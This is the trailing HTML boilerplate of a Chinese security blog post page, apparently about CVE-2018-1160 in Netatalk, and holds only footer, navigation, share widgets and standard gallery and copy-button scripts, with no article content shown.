          本博客所有文章除特别声明外，著作权归作者所有。转载请注明出处！
          
        </li>
      </ul>
    </div>
    
    <footer class="article-footer">
       
<div class="share-btn">
      <span class="share-sns share-outer">
        <i class="ri-share-forward-line"></i>
        分享
      </span>
      <div class="share-wrap">
        <i class="arrow"></i>
        <div class="share-icons">
          
          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
            <i class="ri-weibo-fill"></i>
          </a>
          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
            <i class="ri-wechat-fill"></i>
          </a>
          <a class="qq share-sns" href="javascript:;" data-type="qq">
            <i class="ri-qq-fill"></i>
          </a>
          <a class="douban share-sns" href="javascript:;" data-type="douban">
            <i class="ri-douban-line"></i>
          </a>
          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
            <i class="icon icon-qzone"></i>
          </a> -->
          
          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
            <i class="ri-facebook-circle-fill"></i>
          </a>
          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
            <i class="ri-twitter-fill"></i>
          </a>
          <a class="google share-sns" href="javascript:;" data-type="google">
            <i class="ri-google-fill"></i>
          </a>
        </div>
      </div>
</div>

<div class="wx-share-modal">
    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
    <p>扫一扫，分享到微信</p>
    <div class="wx-qrcode">
      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://polaris-snowfall.github.io/2024/CVE-2018-1160%20Netatalk-OOB/" alt="微信分享二维码">
    </div>
</div>

<div id="share-mask"></div>  
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CVE/" rel="tag">CVE</a></li></ul>

    </footer>
  </div>

   
  <nav class="article-nav">
    
      <a href="/2024/Slub-Allocator%20Analysis/" class="article-nav-link">
        <strong class="article-nav-caption">上一篇</strong>
        <div class="article-nav-title">
          
            Slub-Allocator 源码分析
          
        </div>
      </a>
    
    
      <a href="/2024/d3ctf-2022%20d3kheap%E4%B8%8ECVE-2021-22555/" class="article-nav-link">
        <strong class="article-nav-caption">下一篇</strong>
        <div class="article-nav-title">d3ctf-2022 d3kheap与CVE-2021-22555</div>
      </a>
    
  </nav>

  
   
    
    <script src="https://cdn.staticfile.org/twikoo/1.4.18/twikoo.all.min.js"></script>
    <div id="twikoo" class="twikoo"></div>
    <script>
        twikoo.init({
            envId: ""
        })
    </script>
 
</article>

</section>
      <footer class="footer">
  <div class="outer">
    <ul>
      <li>
        Copyrights &copy;
        2022-2025
        <i class="ri-heart-fill heart_icon"></i> 翰青HanQi
      </li>
    </ul>
    <ul>
      <li>
        
      </li>
    </ul>
    <ul>
      <li>
        
      </li>
    </ul>
    <ul>
      
    </ul>
    <ul>
      
    </ul>
    <ul>
      <li>
        <!-- cnzz统计 -->
        
        <script type="text/javascript" src='https://s9.cnzz.com/z_stat.php?id=1278069914&amp;web_id=1278069914'></script>
        
      </li>
    </ul>
  </div>
</footer>    
    </main>
    <div class="float_btns">
      <div class="totop" id="totop">
  <i class="ri-arrow-up-line"></i>
</div>

<div class="todark" id="todark">
  <i class="ri-moon-line"></i>
</div>

    </div>
    <aside class="sidebar on">
      <button class="navbar-toggle"></button>
<nav class="navbar">
  
  <div class="logo">
    <a href="/"><img src="/images/ayer-side.svg" alt="北极落小雪"></a>
  </div>
  
  <ul class="nav nav-main">
    
    <li class="nav-item">
      <a class="nav-item-link" href="/">主页</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/archives">归档</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/categories">分类</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/tags">标签</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/2022/About">关于</a>
    </li>
    
  </ul>
</nav>
<nav class="navbar navbar-bottom">
  <ul class="nav">
    <li class="nav-item">
      
      <a class="nav-item-link nav-item-search"  title="搜索">
        <i class="ri-search-line"></i>
      </a>
      
      
    </li>
  </ul>
</nav>
<div class="search-form-wrap">
  <div class="local-search local-search-plugin">
  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
  <div id="local-search-result" class="local-search-result"></div>
</div>
</div>
    </aside>
    <div id="mask"></div>

<!-- #reward -->
<div id="reward">
  <span class="close"><i class="ri-close-line"></i></span>
  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
  <div class="reward-box">
    
    <div class="reward-item">
      <img class="reward-img" src="/images/alipay.jpg">
      <span class="reward-type">支付宝</span>
    </div>
    
    
    <div class="reward-item">
      <img class="reward-img" src="/images/wechat.jpg">
      <span class="reward-type">微信</span>
    </div>
    
  </div>
</div>
    
<script src="/js/jquery-3.6.0.min.js"></script>
 
<script src="/js/lazyload.min.js"></script>

<!-- Tocbot -->
 
<script src="/js/tocbot.min.js"></script>

<script>
  tocbot.init({
    tocSelector: ".tocbot",
    contentSelector: ".article-entry",
    headingSelector: "h1, h2, h3, h4, h5, h6",
    hasInnerContainers: true,
    scrollSmooth: true,
    scrollContainer: "main",
    positionFixedSelector: ".tocbot",
    positionFixedClass: "is-position-fixed",
    fixedSidebarOffset: "auto",
  });
</script>

<script src="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.js"></script>
<link
  rel="stylesheet"
  href="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.css"
/>
<script src="https://cdn.staticfile.org/justifiedGallery/3.8.1/js/jquery.justifiedGallery.min.js"></script>

<script src="/dist/main.js"></script>

<!-- ImageViewer -->
 <!-- Root element of PhotoSwipe. Must have class pswp. -->
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    <!-- Background of PhotoSwipe. 
         It's a separate element as animating opacity is faster than rgba(). -->
    <div class="pswp__bg"></div>

    <!-- Slides wrapper with overflow:hidden. -->
    <div class="pswp__scroll-wrap">

        <!-- Container that holds slides. 
            PhotoSwipe keeps only 3 of them in the DOM to save memory.
            Don't modify these 3 pswp__item elements, data is added later on. -->
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                <!--  Controls are self-explanatory. Order can be changed. -->

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
                <!-- element will get class pswp__preloader--active when preloader is running -->
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div>

<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.css">
<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/default-skin/default-skin.min.css">
<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.js"></script>
<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>

<script>
    function viewer_init() {
        let pswpElement = document.querySelectorAll('.pswp')[0];
        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))

        $imgArr.forEach(($em, i) => {
            $em.onclick = () => {
                // slider展开状态
                // todo: 这样不好，后面改成状态
                if (document.querySelector('.left-col.show')) return
                let items = []
                $imgArr.forEach(($em2, i2) => {
                    let img = $em2.getAttribute('data-idx', i2)
                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
                    let title = $em2.getAttribute('alt')
                    // 获得原图尺寸
                    const image = new Image()
                    image.src = src
                    items.push({
                        src: src,
                        w: image.width || $em2.width,
                        h: image.height || $em2.height,
                        title: title
                    })
                })
                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
                    index: parseInt(i)
                });
                gallery.init()
            }
        })
    }
    viewer_init()
</script> 
<!-- MathJax -->

<!-- Katex -->

<!-- busuanzi  -->

<!-- ClickLove -->
 
<script src="/js/clickLove.js"></script>
 
<!-- ClickBoom1 -->

<!-- ClickBoom2 -->

<!-- CodeCopy -->
 
<link rel="stylesheet" href="/css/clipboard.css">
 <script src="https://cdn.staticfile.org/clipboard.js/2.0.10/clipboard.min.js"></script>
<script>
  function wait(callback, seconds) {
    var timelag = null;
    timelag = window.setTimeout(callback, seconds);
  }
  !function (e, t, a) {
    var initCopyCode = function(){
      var copyHtml = '';
      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
      copyHtml += '</button>';
      $(".highlight .code pre").before(copyHtml);
      $(".article pre code").before(copyHtml);
      var clipboard = new ClipboardJS('.btn-copy', {
        target: function(trigger) {
          return trigger.nextElementSibling;
        }
      });
      clipboard.on('success', function(e) {
        let $btn = $(e.trigger);
        $btn.addClass('copied');
        let $icon = $($btn.find('i'));
        $icon.removeClass('ri-file-copy-2-line');
        $icon.addClass('ri-checkbox-circle-line');
        let $span = $($btn.find('span'));
        $span[0].innerText = 'COPIED';
        
        wait(function () { // 等待两秒钟后恢复
          $icon.removeClass('ri-checkbox-circle-line');
          $icon.addClass('ri-file-copy-2-line');
          $span[0].innerText = 'COPY';
        }, 2000);
      });
      clipboard.on('error', function(e) {
        e.clearSelection();
        let $btn = $(e.trigger);
        $btn.addClass('copy-failed');
        let $icon = $($btn.find('i'));
        $icon.removeClass('ri-file-copy-2-line');
        $icon.addClass('ri-time-line');
        let $span = $($btn.find('span'));
        $span[0].innerText = 'COPY FAILED';
        
        wait(function () { // 等待两秒钟后恢复
          $icon.removeClass('ri-time-line');
          $icon.addClass('ri-file-copy-2-line');
          $span[0].innerText = 'COPY';
        }, 2000);
      });
    }
    initCopyCode();
  }(window, document);
</script>
 
<!-- CanvasBackground -->
 
<script src="/js/dz.js"></script>
 
<script>
  if (window.mermaid) {
    mermaid.initialize({ theme: "forest" });
  }
</script>


    
    

  </div><!-- hexo-inject:begin --><!-- hexo-inject:end -->
</body>

</html>